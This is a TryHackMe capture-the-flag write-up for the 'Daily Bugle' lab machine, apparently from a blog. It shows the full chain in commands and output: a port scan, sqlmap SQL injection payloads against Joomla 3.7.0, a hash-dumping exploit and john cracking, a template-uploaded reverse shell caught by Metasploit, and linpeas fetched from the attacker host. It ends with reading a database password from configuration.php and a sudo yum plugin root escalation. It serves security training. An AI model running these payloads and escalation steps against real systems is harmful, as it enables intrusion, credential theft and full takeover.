---
title: "TryHackMe - Daily Bugle"
categories:
  - TryHackMe
tags:
  - cms
  - sqli
  - exploit
  - writeup
  - tryhackme
  - hacking
  - yum 
---
Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

## Scanning
Running `rustscan` to scan all ports and with `aggressive` mode from nmap.
```bash
$ rustscan -a 10.10.89.61 -- -A  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.89.61:22
Open 10.10.89.61:80
Open 10.10.89.61:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-11 22:20 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:20
Completed NSE at 22:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:20
Completed NSE at 22:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:20
Completed NSE at 22:20, 0.00s elapsed
Initiating Ping Scan at 22:20
Scanning 10.10.89.61 [2 ports]
Completed Ping Scan at 22:20, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:20
Completed Parallel DNS resolution of 1 host. at 22:20, 13.01s elapsed
DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 22:20
Scanning 10.10.89.61 [3 ports]
Discovered open port 80/tcp on 10.10.89.61
Discovered open port 3306/tcp on 10.10.89.61
Discovered open port 22/tcp on 10.10.89.61
Completed Connect Scan at 22:20, 0.20s elapsed (3 total ports)
Initiating Service scan at 22:20
Scanning 3 services on 10.10.89.61
Completed Service scan at 22:20, 11.73s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.89.61.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:20
Completed NSE at 22:20, 6.15s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:20
Completed NSE at 22:20, 1.37s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:20
Completed NSE at 22:20, 0.00s elapsed
Nmap scan report for 10.10.89.61
Host is up, received syn-ack (0.20s latency).
Scanned at 2021-01-11 22:20:22 EST for 32s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   syn-ack MariaDB (unauthorized)
```

## Enumeration
Let's visit the port 80 first. It's joomla CMS, from the scan result before.
<a href="/assets/images/tryhackme/daily-bugle/1.png"><img src="/assets/images/tryhackme/daily-bugle/1.png"></a>

Looks like the "Spider-Man" robbed the bank on the post.
<a href="/assets/images/tryhackme/daily-bugle/2.png"><img src="/assets/images/tryhackme/daily-bugle/2.png"></a>

Let's see the source code of the main page.
<a href="/assets/images/tryhackme/daily-bugle/3.png"><img src="/assets/images/tryhackme/daily-bugle/3.png"></a>

Let's go to the directory `/media/system/js/` to see what's inside.
<a href="/assets/images/tryhackme/daily-bugle/4.png"><img src="/assets/images/tryhackme/daily-bugle/4.png"></a>

The Javascript file has the `last modified` value in 2017, let's check if there is `joomla` exploit in 2017.
<a href="/assets/images/tryhackme/daily-bugle/5.png"><img src="/assets/images/tryhackme/daily-bugle/5.png"></a>

Yea there is, it's `joomla` version 3.7.0. Let's use the exploit then

## Exploit!
Open [exploitdb](https://www.exploit-db.com/exploits/42033) and follow the instruction.
<a href="/assets/images/tryhackme/daily-bugle/6.png"><img src="/assets/images/tryhackme/daily-bugle/6.png"></a>

Use the payload to `sqlmap`:
```bash
sqlmap -u "http://10.10.89.61/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
...
sqlmap identified the following injection point(s) with a total of 2713 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 8206 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(8206=8206,1))),0x717a6b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9200 FROM (SELECT(SLEEP(5)))jNcP)
---
```

I tried dump all the databases but it didn't worked. So i try to search the exploit again and i found [this one](https://github.com/stefanlucas/Exploit-Joomla). Let's try it.
```bash
$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py

$ python joomblah.py http://10.10.89.61                                                                  1 ⨯
                                                                                                                                                                                                                              
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

We got some username and hashed password, lets crack it.
```bash
$ john -format=bcrypt -wordlist=/usr/share/wordlists/rockyou.txt hash.txt                                1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REDACTED     (jonah)
1g 0:00:03:26 DONE (2021-01-12 00:10) 0.004844g/s 227.0p/s 227.0c/s 227.0C/s sweetsmile..setsuna
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We got jonah's password, it's REDACTED. Let's login to the joomla administrator.
<a href="/assets/images/tryhackme/daily-bugle/7.png"><img src="/assets/images/tryhackme/daily-bugle/7.png"></a>

Succeed!
<a href="/assets/images/tryhackme/daily-bugle/8.png"><img src="/assets/images/tryhackme/daily-bugle/8.png"></a>

Let's upload our reverse shell on the `template` section.
<a href="/assets/images/tryhackme/daily-bugle/9.png"><img src="/assets/images/tryhackme/daily-bugle/9.png"></a>

Now, set up our listener.
```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > set LHOST 10.11.25.205
LHOST => 10.11.25.205
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.25.205:9999
```

Run the exploit from the directory we uploaded earlier, here i use `/index.php` directory and we got the shell back.
```bash
[*] Sending stage (36 bytes) to 10.10.89.61
[*] Command shell session 2 opened (10.11.25.205:9999 -> 10.10.89.61:52292) at 2021-01-12 00:31:13 -0500

 00:31:15 up  2:29,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ ��Yj?X��Iy�jX�Rh//shh/bin��RS��^Z
```

Upgrade our shell to meterpreter.
```bash
msf6 exploit(multi/handler) > sessions -u 2
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.11.25.205:4433 
[*] Sending stage (976712 bytes) to 10.10.89.61
[*] Meterpreter session 3 opened (10.11.25.205:4433 -> 10.10.89.61:58022) at 2021-01-12 00:31:31 -0500
[*] Command stager progress: 100.00% (773/773 bytes)

msf6 exploit(multi/handler) > sessions -i 3
[*] Starting interaction with 3...

meterpreter >
```

Run linpeas.
```bash
bash-4.2$ wget IP:8080/linpeas.sh
bash-4.2$ chmod +x linpeas.sh
bash-4.2$ ./linpeas.sh
...
[+] Searching supervisord configuration file
[+] Searching cesi configuration file
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
[+] Searching Knock configuration
[+] Checking misconfigurations of ld.so
/var/www/html/configuration.php
/var/www/html/configuration.php:        public $password = 'REDACTED';
...
```


We got something, let's check the configuration file.
```bash
bash-4.2$ cat /var/www/html/configuration.php    
cat /var/www/html/configuration.php    
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'REDACTED';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
```

Change user to `jjameson`.
```bash
bash-4.2$ su jjameson
su jjameson
Password: REDACTED

[jjameson@dailybugle tmp]$ 
```

user.txt:
```bash
[jjameson@dailybugle ~]$ cat ~/user.txt
REDACTED
```

## Escalate

Check sudo priv.
```bash
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Let's use sudo to escalate using [yum](https://gtfobins.github.io/gtfobins/yum/#sudo).
```bash
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
TF=$(mktemp -d)

[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y

sh-4.2# whoami
whoami
root
```

root.txt:
```bash
sh-4.2# cat /root/root.txt
REDACTED
```